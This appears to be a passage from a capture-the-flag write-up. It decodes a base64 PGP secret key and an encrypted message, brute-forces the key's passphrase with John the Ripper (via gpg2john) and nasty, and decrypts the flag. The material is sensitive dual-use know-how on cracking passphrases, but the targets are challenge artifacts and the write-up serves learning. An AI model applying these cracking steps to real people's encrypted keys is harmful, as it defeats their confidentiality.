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
DX0scQqRx3FFgGoUjJfQRA==
-------------------------------------------------
hQGMAxcYmah/ykbaAQv/YF+v5ElbV8cCtYTmB5yJ4AI2v5+3OUzQaOhC1W1OWn5JqkbPxkQqbfC6
81OKFjSA9L7BWWn2qNnYlmT8Hxu+Ux4CsO1YZHZ1MNJSZHdDIpire9Tplr0fkGO/GLKuSUxq20/7
gJ3AdnqABuEOZzEpXmtgUy1PCVeJjXy4RG8hGsq0/lOf6ry+zeGBMQPDldPVRoEEJIOkvbOSKMfh
VoOZMe1LpRbMt1Q14TD6HTghAN+HmEzfZ/sdggFftRev1f9nC6Y6TgCIBTx0y4X/yhvZWc+HKC0s
Rc5yBhWtaM66PSfnN3sZKnK4z5fWMMIlvyOUTa1JGNc37ZNqQMB9Sb5HIVrmFJ4Oq5x9OdIY/Gk9
aRVguU3Z79vrPm55gulzX8Mp27DncSQLINmp/zBV8NjC09ip7l3lHcLB32ks+POild/5kGRIcvmn
/Z50xcCgOK+orpkPodNOTTVRosTwdBifFPd9PN9cW1vki4WGO+5rZSM5KfC0jGo74Nf1ss1+Bwoo
0k4B1YvEv8aWpZZtdzUqIg5HH2uAHfv480KiOUdHoq7YcGV2N1Q4kcryh26tAmrVu4628qPgG0vO
9rc8/WTNYfRPB2U8c0FYdYDOATvzYaY=
```



Split it into files across the dashed line and notice that the '=' and '==' at the end make it look like base64 encoding.

So split the file into two files `tmp2.txt` and `tmp3.txt`. Run base64 decode each one as below:

```
base64 -d tmp3.txt > tmp3.bin
```

 Run file command to determine file types:

```
$ file tmp2.bin 
tmp2.bin: PGP\011Secret Key - 3072b created on Thu Jun 14 16:51:44 2018 - RSA (Encrypt or Sign) e=65537 hashed AES with 128-bit key Salted&Iterated S2K SHA-1

$ file tmp3.bin 
tmp3.bin: PGP RSA encrypted session key - keyid: A8991817 DA46CA7F RSA (Encrypt or Sign) 3072b .
```



Lets see what information is contained in the Secret key:

```
$ pgpdump tmp2.bin 
Old: Secret Key Packet(tag 5)(1414 bytes)
	Ver 4 - new
	Public key creation time - Thu Jun 14 16:51:44 MSK 2018
	Pub alg - RSA Encrypt or Sign(pub 1)
	RSA n(3072 bits) - ...
	RSA e(17 bits) - ...
	Sym alg - AES with 128-bit key(sym 7)
	Iterated and salted string-to-key(s2k 3):
		Hash alg - SHA1(hash 2)
		Salt - a7 ee 1c a3 26 7f a7 1e 
		Count - 65011712(coded count 255)
	IV - 21 e9 da 94 91 de f9 65 a5 3e f7 1d 7e a8 4b 6f 
	Encrypted RSA d
	Encrypted RSA p
	Encrypted RSA q
	Encrypted RSA u
	Encrypted SHA1 hash
Old: User ID Packet(tag 13)(24 bytes)
	User ID - Elvis <elvis@esreal.com>
Old: Signature Packet(tag 2)(468 bytes)
	Ver 4 - new
	Sig type - Positive certification of a User ID and Public Key packet(0x13).
	Pub alg - RSA Encrypt or Sign(pub 1)
	Hash alg - SHA512(hash 10)
	Hashed Sub: unknown(sub 33)(21 bytes)
	Hashed Sub: signature creation time(sub 2)(4 bytes)
		Time - Thu Jun 14 16:51:44 MSK 2018
	Hashed Sub: key flags(sub 27)(1 bytes)
		Flag - This key may be used to certify other keys
		Flag - This key may be used to sign data
	Hashed Sub: key expiration time(sub 9)(4 bytes)
		Time - Sat Jun 13 16:51:44 MSK 2020
	Hashed Sub: preferred symmetric algorithms(sub 11)(4 bytes)
		Sym alg - AES with 256-bit key(sym 9)
		Sym alg - AES with 192-bit key(sym 8)
		Sym alg - AES with 128-bit key(sym 7)
		Sym alg - Triple-DES(sym 2)
	Hashed Sub: preferred hash algorithms(sub 21)(5 bytes)
		Hash alg - SHA512(hash 10)
		Hash alg - SHA384(hash 9)
		Hash alg - SHA256(hash 8)
		Hash alg - SHA224(hash 11)
		Hash alg - SHA1(hash 2)
	Hashed Sub: preferred compression algorithms(sub 22)(3 bytes)
		Comp alg - ZLIB <RFC1950>(comp 2)
		Comp alg - BZip2(comp 3)
		Comp alg - ZIP <RFC1951>(comp 1)
	Hashed Sub: features(sub 30)(1 bytes)
		Flag - Modification detection (packets 18 and 19)
	Hashed Sub: key server preferences(sub 23)(1 bytes)
		Flag - No-modify
	Sub: issuer key ID(sub 16)(8 bytes)
		Key ID - 0xE1D24027D28DA6DB
	Hash left 2 bytes - 60 ff 
	RSA m^d mod n(3070 bits) - ...
		-> PKCS-1
Old: Secret Subkey Packet(tag 7)(1414 bytes)
	Ver 4 - new
	Public key creation time - Thu Jun 14 16:51:44 MSK 2018
	Pub alg - RSA Encrypt or Sign(pub 1)
	RSA n(3072 bits) - ...
	RSA e(17 bits) - ...
	Sym alg - AES with 128-bit key(sym 7)
	Iterated and salted string-to-key(s2k 3):
		Hash alg - SHA1(hash 2)
		Salt - 50 09 28 09 68 bc 1b ed 
		Count - 65011712(coded count 255)
	IV - 35 a4 bb 9d bc b4 39 9b c9 49 76 f6 ec 94 ce 68 
	Encrypted RSA d
	Encrypted RSA p
	Encrypted RSA q
	Encrypted RSA u
	Encrypted SHA1 hash
Old: Signature Packet(tag 2)(444 bytes)
	Ver 4 - new
	Sig type - Subkey Binding Signature(0x18).
	Pub alg - RSA Encrypt or Sign(pub 1)
	Hash alg - SHA512(hash 10)
	Hashed Sub: unknown(sub 33)(21 bytes)
	Hashed Sub: signature creation time(sub 2)(4 bytes)
		Time - Thu Jun 14 16:51:44 MSK 2018
	Hashed Sub: key flags(sub 27)(1 bytes)
		Flag - This key may be used to encrypt communications
		Flag - This key may be used to encrypt storage
	Hashed Sub: key expiration time(sub 9)(4 bytes)
		Time - Sat Jun 13 16:51:44 MSK 2020
	Sub: issuer key ID(sub 16)(8 bytes)
		Key ID - 0xE1D24027D28DA6DB
	Hash left 2 bytes - 21 db 
	RSA m^d mod n(3068 bits) - ...
		-> PKCS-1
```

I guess the highlight from the above output is:

```
Old: User ID Packet(tag 13)(24 bytes)
	User ID - Elvis <elvis@esreal.com>
```



Running pgpdump on the other part of data gives the output below:

```
$ pgpdump tmp3.bin 
Old: Public-Key Encrypted Session Key Packet(tag 1)(396 bytes)
	New version(3)
	Key ID - 0x171899A87FCA46DA
	Pub alg - RSA Encrypt or Sign(pub 1)
	RSA m^e mod n(3071 bits) - ...
		-> m = sym alg(1 byte) + checksum(2 bytes) + PKCS-1 block type 02
New: Symmetrically Encrypted and MDC Packet(tag 18)(78 bytes)
	Ver 1
	Encrypted data [sym alg is specified in pub-key encrypted session key]
		(plain text + MDC SHA1(20 bytes))

```

So one is a key file and another  is some encrypted data. Lets try decrypting the data. 

Looking at the data in more detail:

```
$ gpg2 --verbose --batch --list-packets tmp3.bin 
gpg: public key is 171899A87FCA46DA
gpg: encrypted with RSA key, ID 171899A87FCA46DA
gpg: decryption failed: No secret key

# off=0 ctb=85 tag=1 hlen=3 plen=396
:pubkey enc packet: version 3, algo 1, keyid 171899A87FCA46DA
	data: 605FAFE4495B57C702B584E6079C89E00236BF9FB7394CD068E842D56D4E5A7E49AA46CFC6442A6DF0BAF3538A163480F4BEC15969F6A8D9D89664FC1F1BBE531E02B0ED5864767530D2526477432298AB7BD4E996BD1F9063BF18B2AE494C6ADB4FFB809DC0767A8006E10E6731295E6B60532D4F0957898D7CB8446F211ACAB4FE539FEABCBECDE1813103C395D3D54681042483A4BDB39228C7E156839931ED4BA516CCB75435E130FA1D382100DF87984CDF67FB1D82015FB517AFD5FF670BA63A4E0088053C74CB85FFCA1BD959CF87282D2C45CE720615AD68CEBA3D27E7377B192A72B8CF97D630C225BF23944DAD4918D737ED936A40C07D49BE47215AE6149E0EAB9C7D39D218FC693D691560B94DD9EFDBEB3E6E7982E9735FC329DBB0E771240B20D9A9FF3055F0D8C2D3D8A9EE5DE51DC2C1DF692CF8F3A295DFF990644872F9A7FD9E74C5C0A038AFA8AE990FA1D34E4D3551A2C4F074189F14F77D3CDF5C5B5BE48B85863BEE6B65233929F0B48C6A3BE0D7F5B2CD7E070A28

# off=399 ctb=d2 tag=18 hlen=2 plen=78 new-ctb
:encrypted data packet:
	length: 78
	mdc_method: 2
```



We can see that the actual data is length 78 bytes (last lines of output).

Install the second version of GPG from package gnupg2. In GPG there are always two keys in term of management: public and private. (even if public is derived from private). The keys can have a passphrase. You will need it when importing or exporting because format may be different for database between export and import.

source: https://superuser.com/questions/1135812/gpg2-asking-for-passphrase-when-importing-secret-keys



When importing the key as below:

```
$ gpg2 --import tmp2.bin 
gpg: key E1D24027D28DA6DB: public key "Elvis <elvis@esreal.com>" imported
gpg: key E1D24027D28DA6DB/E1D24027D28DA6DB: error sending to agent: No passphrase given
gpg: error building skey array: No passphrase given
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
```

We can see that the key requires a passphrase to use the secret key.

I attempted several methods to get the passphrase:

- JohnTheRipper - bruteforcing from standard password lists
- Nasty (source: https://www.bfoliver.com/technology/2015/10/20/bruteforcegpg/) 

Which were not successful. Then it was possible that the passphrase was inside the binary file, so I extracted strings from it and used that to bruteforce, however there was also no luck.

```
$ nasty -m file -c + -i wordlist.txt -f output.txt
nasty v0.6, (C) 2005 by folkert@vanheusden.com

# tried: 13 (4.333333 per second), last tried: Lavf57

# tried: 26 (4.333333 per second), last tried: Pyh

...

# tried: 40776 (4.336950 per second), last tried: bMt1Q14TD6

# tried: 40791 (4.337161 per second), last tried: Gk9

# tried: 40805 (4.337266 per second), last tried: 1vki4WGO

# tried: 40820 (4.337477 per second), last tried: TvzYaY
```

Finally I tried extracting the hash with gpg2john and just running john the ripper through all possible combinations (i.e. without wordlist, just alphanumeric characters)

Eventually it found the password:

```
elviselvis
```

Then I imported the key, set it to trust ultimately, and tried decrypting again:

```
gpg2 --verbose -o data.txt -d tmp3.bin
gpg: public key is 171899A87FCA46DA
gpg: using subkey 171899A87FCA46DA instead of primary key E1D24027D28DA6DB
gpg: pinentry launched (5305 gnome3 1.1.0 /dev/pts/8 xterm-256color :0)
gpg: using subkey 171899A87FCA46DA instead of primary key E1D24027D28DA6DB
gpg: encrypted with 3072-bit RSA key, ID 171899A87FCA46DA, created 2018-06-14
      "Elvis <elvis@esreal.com>"
gpg: AES256 encrypted data
gpg: original file name='flag'
```

And the actual data was as below:
```
$ cat data.txt 
elvissiguevivo
```


